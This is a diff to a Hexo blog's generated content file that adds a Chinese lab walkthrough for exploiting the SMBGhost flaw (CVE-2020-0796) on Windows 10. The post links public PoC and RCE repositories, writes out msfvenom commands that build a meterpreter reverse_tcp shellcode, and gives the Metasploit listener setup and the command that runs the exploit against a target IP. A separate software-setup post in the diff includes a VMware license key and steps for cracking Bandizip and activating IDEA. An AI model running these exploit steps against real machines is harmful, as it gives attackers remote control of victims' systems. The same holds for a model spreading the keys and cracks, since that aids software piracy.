@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>永恒之黑漏洞参考文档</title>
+      <link href="/2024/07/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/"/>
+      <url>/2024/07/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/</url>
+      
+        <content type="html"><![CDATA[<p>POC(蓝屏):漏洞证明</p><blockquote><p>下载<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a><br>使用<br><code>pip install ntlm_auth</code></p></blockquote><p> .&#x2F;CVE-2020-0796.py  192.168.30.134</p><p> EXP(RCE)：漏洞利用</p><p>下载<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a><br> 接下来使用kali作为攻击机</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.223.128  LPORT=5555 -b &#x27;\x00&#x27; -i 5 -f python &gt; exploit</span><br></pre></td></tr></table></figure><p> 使用vim</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim exploit                     </span><br><span class="line">:%s/buf/USER_PAYLOAD             </span><br><span class="line">:wq!  </span><br></pre></td></tr></table></figure><p> 去文件夹将exploit内容替换到exploit.py</p><p> 参考<a href="https://blog.csdn.net/weixin_63610715/article/details/133847253">https://blog.csdn.net/weixin_63610715/article/details/133847253</a></p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">set lhost 192.168.20.128</span><br><span class="line">set lport 5555</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">python exploit.py -ip 192.168.20.128（靶机ip)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><h2 id="一、复现环境"><a href="#一、复现环境" class="headerlink" title="一、复现环境"></a>一、复现环境</h2><p>靶机：windows10 1903 x64ip：192.168.1.6（关闭防火墙）<br>下载地址：<a href="https://sl-m-ssl.xunlei.com/h5/page/download-share/index.html?entry=link&appType=PC&videobtindex=-1&storid=c39vhtrekug5&share_from=dlpage_share_link">https://sl-m-ssl.xunlei.com/h5/page/download-share/index.html?entry=link&amp;appType=PC&amp;videobtindex=-1&amp;storid=c39vhtrekug5&amp;share_from=dlpage_share_link</a><br>攻击机：kali2019ip：192.168.1.10<br><img src="/../img/image.webp"><br><img src="/../img/image%201.webp"></p><h2 id="二、检测工具："><a href="#二、检测工具：" class="headerlink" title="二、检测工具："></a>二、检测工具：</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>1.在靶机里下载检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/</a></p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p>2.运行工具，检测到漏洞风险<br><img src="/../img/image%202.webp"></p><h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><p>POC下载：</p><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><ol><li>在kali中利用MSF生成木马：</li></ol><p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.129 LPORT=5555 -b &#39;\x00&#39; -i 1 -f python &gt; exploit</code></p><p>&#x2F;&#x2F; -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp 设置payload为windows64位meterpreter控制台下的反向连接<br>&#x2F;&#x2F; LPORT&#x3D;6666 设置开发端口为6666<br>&#x2F;&#x2F; -b ‘\x00’ 设置在生成的程序中避免出现’\x00’<br>&#x2F;&#x2F; -i 1 设置编码次数为一次<br>&#x2F;&#x2F; -f python 设置生成python格式文件</p><h3 id="2-用生成的shellcode将POC文件里exploit-py中的一部分替换掉，直接复制粘贴，将buf替换成USER-PAYLOAD保存"><a href="#2-用生成的shellcode将POC文件里exploit-py中的一部分替换掉，直接复制粘贴，将buf替换成USER-PAYLOAD保存" class="headerlink" title="2.用生成的shellcode将POC文件里exploit.py中的一部分替换掉，直接复制粘贴，将buf替换成USER_PAYLOAD保存"></a>2.用生成的shellcode将POC文件里exploit.py中的一部分替换掉，直接复制粘贴，将buf替换成USER_PAYLOAD保存</h3><p><img src="/../img/image%203.webp"></p><h3 id="3-kali开启监听"><a href="#3-kali开启监听" class="headerlink" title="3. kali开启监听"></a>3. kali开启监听</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 192.168.20.128</span><br><span class="line">set lport 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="4-运行exp"><a href="#4-运行exp" class="headerlink" title="4. 运行exp"></a>4. 运行exp</h3><p><code>python3 exploit.py -ip 192.168.20.128</code><br><img src="/../img/image%204.webp"><br>如果失败，多试几十次，中间会蓝屏，等各种情况，属于正常行为</p><h3 id="5-命令执行"><a href="#5-命令执行" class="headerlink" title="5. 命令执行"></a>5. 命令执行</h3><p><img src="/../img/image%205.webp"></p><h3 id="6-简易原理图"><a href="#6-简易原理图" class="headerlink" title="6. 简易原理图"></a>6. 简易原理图</h3><p><img src="/../img/Pasted%20image%2020240711201750.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 参考文档 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title></title>
       <link href="/2024/07/11/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%953/"/>
       <url>/2024/07/11/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%953/</url>
@@ -17,39 +42,19 @@
     
     
     <entry>
-      <title></title>
-      <link href="/2024/07/11/%E6%9C%AA%E5%91%BD%E5%90%8D%201/"/>
-      <url>/2024/07/11/%E6%9C%AA%E5%91%BD%E5%90%8D%201/</url>
-      
-        <content type="html"><![CDATA[<hr><h2 id="title-图片测试"><a href="#title-图片测试" class="headerlink" title="title:图片测试"></a>title:图片测试</h2><p>![[..&#x2F;img&#x2F;Pasted image 20240711092343.png]]</p><p><img src="/../img/Pasted%20image%2020240711093754.png"></p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>配置教程</title>
       <link href="/2024/07/10/%E7%95%8C%E9%9D%A2/"/>
       <url>/2024/07/10/%E7%95%8C%E9%9D%A2/</url>
       
-        <content type="html"><![CDATA[<p>1<a href="https://www.vmware.com/products/desktop-hypervisor.html">vmware17</a><br>2<a href="https://public.xp.cn/upgrades/phpStudy_64.zip">phpstudy</a><br>3<a href="https://download.oracle.com/java/22/latest/jdk-22_windows-x64_bin.msi">java22</a><br>4<a href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/%E8%AF%AD%E8%A8%80%E7%8E%AF%E5%A2%83/python-3.9.2rc1-amd64.exe">python3.9</a><br>5<a href="https://download-cdn.jetbrains.com/idea/ideaIU-2024.1.4.exe">IDEA</a><br>6<a href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/Navicat%20Premium%2012.zip">Navicat</a><br>7<a href="https://vscode.download.prss.microsoft.com/dbazure/download/stable/ea1445cc7016315d0f5728f8e8b12a45dc0a7286/VSCodeUserSetup-x64-1.91.0.exe">vscode</a><br>8<a href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/Uninstall%20Tool.zip">Uninstall Tool(系统软件卸载工具)</a>不是必须的<br>9<a href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/Bandizip%20v7.23.zip">bandzip(解压软件)</a>不是必须的<br>10<a href="https://www.voidtools.com/Everything-1.4.1.1024.x64-Setup.exe">everything(</a>全局文件搜索软件)不是必须的  </p><h1 id="软件安装方法"><a href="#软件安装方法" class="headerlink" title="软件安装方法"></a>软件安装方法</h1><p><a href="http://sunwu.world/2023/02/14/vmware17%e5%ae%89%e8%a3%85%e5%8f%8awin11%e5%ae%89%e8%a3%85/">vmware</a></p><p>许可证: <code>JU090-6039P-08409-8J0QH-2YR7F</code>  </p><p>phpstudy<br>建议安装路径不要修改，默认安装在D盘  </p><p>java22<br>记得选择安装路径，要求安装路径记得  </p><h2 id="python3-9"><a href="#python3-9" class="headerlink" title="python3.9"></a>python3.9</h2><ol><li>加入<code>path</code>，自定义安装<br>![[Pasted image 20240708154242.png]]</li><li>全部勾选<br>![[Pasted image 20240708154324.png]]</li><li>前四个全勾，并选择安装位置<br>![[Pasted image 20240708154436.png]]</li><li>注意自定义安装位置</li><li>打开系统环境变量<br>![[Pasted image 20240708154643.png]]<br>![[Pasted image 20240708154656.png]]</li><li>将python加入系统环境变量(复制粘贴)<br>![[Pasted image 20240708154742.png]]</li><li>确定，确定，重启电脑</li></ol><h2 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h2><ol><li>选择路径安装idea，全勾<br><img src="/../img/Pasted%20image%2020240710202427.png"></li><li>安装完成,关闭idea，以管理员身份运行激活包<br><img src="/../img/Pasted%20image%2020240710202439.png"></li><li>激活完毕，重启电脑  </li><li>输入激活码<br><img src="/../img/Pasted%20image%2020240710202451.png"></li></ol><h2 id="bandzip-解压软件"><a href="#bandzip-解压软件" class="headerlink" title="bandzip(解压软件)"></a>bandzip(解压软件)</h2><ol><li>正常安装，记得选择安装路径<br><img src="/../img/Pasted%20image%2020240710202501.png"></li><li>破解<br><img src="/../img/Pasted%20image%2020240710202521.png"></li><li>去广告，选项-设置<br><img src="/../img/Pasted%20image%2020240710202539.png"></li></ol><h1 id="vscode插件"><a href="#vscode插件" class="headerlink" title="vscode插件"></a>vscode插件</h1><ol><li><p>codeium<br><img src="/../img/Pasted%20image%2020240710202550.png"></p></li><li><p>chinese<br><img src="/../img/Pasted%20image%2020240710202558.png"></p></li><li><p>code runner<br><img src="/../img/Pasted%20image%2020240710202606.png"></p></li><li><p>ctrl+滚轮(调节字体大小)</p></li></ol><p>注：  </p><ol><li>安装路径不要有中文  </li><li>最好不装在C盘  </li><li>安装路径不要有空格和符号(_除外)</li></ol>]]></content>
+        <content type="html"><![CDATA[<h1 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h1><p>1<a href="https://www.vmware.com/products/desktop-hypervisor.html">vmware17</a><br>2<a href="https://public.xp.cn/upgrades/phpStudy_64.zip">phpstudy</a><br>3<a href="https://download.oracle.com/java/22/latest/jdk-22_windows-x64_bin.msi">java22</a><br>4<a href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/%E8%AF%AD%E8%A8%80%E7%8E%AF%E5%A2%83/python-3.9.2rc1-amd64.exe">python3.9</a><br>5<a href="https://download-cdn.jetbrains.com/idea/ideaIU-2024.1.4.exe">IDEA</a><br>6<a href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/Navicat%20Premium%2012.zip">Navicat</a><br>7<a href="https://vscode.download.prss.microsoft.com/dbazure/download/stable/ea1445cc7016315d0f5728f8e8b12a45dc0a7286/VSCodeUserSetup-x64-1.91.0.exe">vscode</a><br>8<a href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/Uninstall%20Tool.zip">Uninstall Tool(系统软件卸载工具)</a>不是必须的<br>9<a href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/Bandizip%20v7.23.zip">bandzip(解压软件)</a>不是必须的<br>10<a href="https://www.voidtools.com/Everything-1.4.1.1024.x64-Setup.exe">everything(</a>全局文件搜索软件)不是必须的  </p><h1 id="软件安装方法"><a href="#软件安装方法" class="headerlink" title="软件安装方法"></a>软件安装方法</h1><p><a href="http://sunwu.world/2023/02/14/vmware17%e5%ae%89%e8%a3%85%e5%8f%8awin11%e5%ae%89%e8%a3%85/">vmware</a></p><p>许可证: <code>JU090-6039P-08409-8J0QH-2YR7F</code>  </p><p>phpstudy<br>建议安装路径不要修改，默认安装在D盘  </p><p>java22<br>记得选择安装路径，要求安装路径记得  </p><h2 id="python3-9"><a href="#python3-9" class="headerlink" title="python3.9"></a>python3.9</h2><ol><li>加入<code>path</code>，自定义安装<br>![[Pasted image 20240708154242.png]]</li><li>全部勾选<br>![[Pasted image 20240708154324.png]]</li><li>前四个全勾，并选择安装位置<br>![[Pasted image 20240708154436.png]]</li><li>注意自定义安装位置</li><li>打开系统环境变量<br>![[Pasted image 20240708154643.png]]<br>![[Pasted image 20240708154656.png]]</li><li>将python加入系统环境变量(复制粘贴)<br>![[Pasted image 20240708154742.png]]</li><li>确定，确定，重启电脑</li></ol><h2 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h2><ol><li>选择路径安装idea，全勾<br><img src="/../img/Pasted%20image%2020240710202427.png"></li><li>安装完成,关闭idea，以管理员身份运行激活包<br><img src="/../img/Pasted%20image%2020240710202439.png"></li><li>激活完毕，重启电脑  </li><li>输入激活码<br><img src="/../img/Pasted%20image%2020240710202451.png"></li></ol><h2 id="bandzip-解压软件"><a href="#bandzip-解压软件" class="headerlink" title="bandzip(解压软件)"></a>bandzip(解压软件)</h2><ol><li>正常安装，记得选择安装路径<br><img src="/../img/Pasted%20image%2020240710202501.png"></li><li>破解<br><img src="/../img/Pasted%20image%2020240710202521.png"></li><li>去广告，选项-设置<br><img src="/../img/Pasted%20image%2020240710202539.png"></li></ol><h1 id="vscode插件"><a href="#vscode插件" class="headerlink" title="vscode插件"></a>vscode插件</h1><ol><li><p>codeium<br><img src="/../img/Pasted%20image%2020240710202550.png"></p></li><li><p>chinese<br><img src="/../img/Pasted%20image%2020240710202558.png"></p></li><li><p>code runner<br><img src="/../img/Pasted%20image%2020240710202606.png"></p></li><li><p>ctrl+滚轮(调节字体大小)</p></li></ol><p>注：  </p><ol><li>安装路径不要有中文  </li><li>最好不装在C盘  </li><li>安装路径不要有空格和符号(_除外)</li></ol>]]></content>
       
       
       
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[object Object]</title>
-      <link href="/2024/07/10/hello/"/>
-      <url>/2024/07/10/hello/</url>
-      
-        <content type="html"><![CDATA[<h1 id="hello-hexo"><a href="#hello-hexo" class="headerlink" title="hello hexo"></a>hello hexo</h1><table><thead><tr><th>第一栏</th><th>第二栏</th></tr></thead><tbody><tr><td>第二栏</td><td></td></tr><tr><td>hello</td><td></td></tr><tr><td></td><td></td></tr><tr><td><img src="/../img/Pasted%20image%2020240710184550.png"></td><td></td></tr></tbody></table>]]></content>
-      
-      
+        <tags>
+            
+            <tag> 学习教程 </tag>
+            
+        </tags>
       
     </entry>
     
@@ -57,12 +62,24 @@
     
     <entry>
       <title>Hello World</title>
-      <link href="/2024/07/10/hello-world/"/>
-      <url>/2024/07/10/hello-world/</url>
+      <link href="/2024/07/10/index/"/>
+      <url>/2024/07/10/index/</url>
       
         <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
       
       
+      <categories>
+          
+          <category> 学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 菜鸟上路 </tag>
+            
+        </tags>
       
     </entry>
     
